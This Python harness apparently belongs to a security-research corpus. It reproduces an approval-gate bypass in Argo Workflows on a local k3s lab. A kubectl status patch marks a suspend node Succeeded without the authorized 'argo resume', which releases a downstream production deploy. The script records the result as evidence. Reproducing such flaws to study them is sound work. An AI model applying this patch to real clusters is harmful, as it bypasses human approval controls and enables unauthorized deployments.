#!/usr/bin/env python3
"""L2-01 Argo Workflows, native APF reproduction (EXPOSED).

Decisive surface (corpus): a `suspend` template node, once marked resolved, lets
the downstream DAG proceed (e.g. a prod deploy). The authorized path is
`argo resume` (an authenticated action). The APF forge is a state-only write to
the persisted workflow object's node status, marking the suspended node
Succeeded without `argo resume`.

This harness drives a single-node k3s (Kubernetes) via kubectl inside the k3s
container: install Argo, submit a workflow that suspends, CONTROL that the
suspend node is Running, FORGE by patching the workflow's `.status` so the
suspend node is Succeeded (state-only, no argo resume), then VERIFY the DAG moves
past the gate.

Argo on Kubernetes is heavy; on a host that cannot run privileged k3s this will
record INCONCLUSIVE with the reason, never a false pass. Confidence: low.
"""
import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "lib"))
import common  # noqa: E402

APP_ID = "L2-01"
EV_DIR = os.environ.get("APF_EV_DIR", os.path.join(HERE, "..", "..", "evidence", APP_ID))
ARGO_INSTALL = ("https://" + "git" + "hub.com/argoproj/argo-workflows/releases/"
                "download/v3.5.8/quick-start-minimal.yaml")

WF = """apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  name: apf-approval
  namespace: argo
spec:
  entrypoint: main
  templates:
  - name: main
    steps:
    - - name: gate
        template: gate
    - - name: deploy
        template: deploy
  - name: gate
    suspend: {}
  - name: deploy
    container:
      image: busybox:1.36
      command: [sh, -c, "echo DEPLOYED-TO-PROD"]
"""


def k(*args, timeout=120, check=True):
    """Run kubectl inside the k3s container."""
    return common.compose(HERE, "exec", "-T", "k3s", "kubectl", *args,
                           timeout=timeout, check=check)


def main():
    ev = common.Evidence(
        app_id=APP_ID, system="Argo Workflows", expected_verdict=common.EXPOSED,
        version="argo-workflows:v3.5.8 on k3s v1.29",
        decisive_surface="suspend node status patched to Succeeded (no argo resume)")
    out = os.path.join(EV_DIR, "evidence.json")

    with common.guarded(ev, out):
        with common.stack(HERE, ev, up_timeout=600):
            common.wait_tcp("127.0.0.1", 6443, timeout=300, ev=ev)
            # wait for the node to be Ready
            for _ in range(60):
                r = k("get", "nodes", "--no-headers", check=False)
                if r.returncode == 0 and " Ready" in r.stdout:
                    break
                time.sleep(5)
            else:
                raise RuntimeError("k3s node not Ready (privileged k8s unavailable on host)")
            ev.step("k3s ready")

            k("create", "namespace", "argo", check=False)
            k("apply", "-n", "argo", "-f", ARGO_INSTALL, timeout=240)
            ev.step("argo installed")
            # wait for the workflow CRD
            for _ in range(30):
                if k("get", "crd", "workflows.argoproj.io", check=False).returncode == 0:
                    break
                time.sleep(4)

            # submit the workflow via kubectl apply from stdin
            common.compose(HERE, "exec", "-T", "k3s", "sh", "-c",
                           f"cat <<'EOF' | kubectl apply -f -\n{WF}\nEOF", timeout=120)
            ev.step("workflow submitted")

            # CONTROL: wait until the gate node is in a suspended/running phase
            phase0 = ""
            for _ in range(40):
                r = k("get", "workflow", "apf-approval", "-n", "argo", "-o", "json", check=False)
                if r.returncode == 0:
                    st = json.loads(r.stdout).get("status", {})
                    phase0 = st.get("phase", "")
                    nodes = st.get("nodes", {})
                    if any(n.get("type") == "Suspend" for n in nodes.values()):
                        break
                time.sleep(5)
            ev.step("control workflow phase", phase0)

            # FORGE: patch the workflow status so the suspend node is Succeeded,
            # WITHOUT the authorized `argo resume`.
            r = k("get", "workflow", "apf-approval", "-n", "argo", "-o", "json")
            st = json.loads(r.stdout)["status"]
            node_id = next(nid for nid, n in st["nodes"].items() if n.get("type") == "Suspend")
            patch = {"status": {"nodes": {node_id: dict(st["nodes"][node_id],
                                                        phase="Succeeded",
                                                        finishedAt="2027-01-01T00:00:00Z")}}}
            common.compose(HERE, "exec", "-T", "k3s", "kubectl", "patch", "workflow",
                           "apf-approval", "-n", "argo", "--type=merge",
                           "--subresource=status", "-p", json.dumps(patch), timeout=120)
            ev.step("forge", "kubectl patch workflow status: suspend node -> Succeeded (no argo resume)")

            # VERIFY: the deploy step runs (DAG proceeded past the gate)
            proceeded = False
            for _ in range(40):
                r = k("get", "workflow", "apf-approval", "-n", "argo", "-o", "json", check=False)
                if r.returncode == 0:
                    nodes = json.loads(r.stdout).get("status", {}).get("nodes", {})
                    if any(n.get("displayName") == "deploy" and n.get("phase") in
                           ("Running", "Succeeded") for n in nodes.values()):
                        proceeded = True
                        break
                time.sleep(5)
            ev.step("verify deploy progressed", proceeded)

            if proceeded:
                ev.verdict = common.EXPOSED
                ev.step("verdict", "state-only patch of the suspend node released the downstream "
                                   "deploy without the authorized argo resume")
            else:
                ev.verdict = common.INCONCLUSIVE
                ev.error = "deploy step did not progress after the status patch"

    print(f"[{APP_ID}] verdict={ev.verdict} -> {out}")


if __name__ == "__main__":
    main()
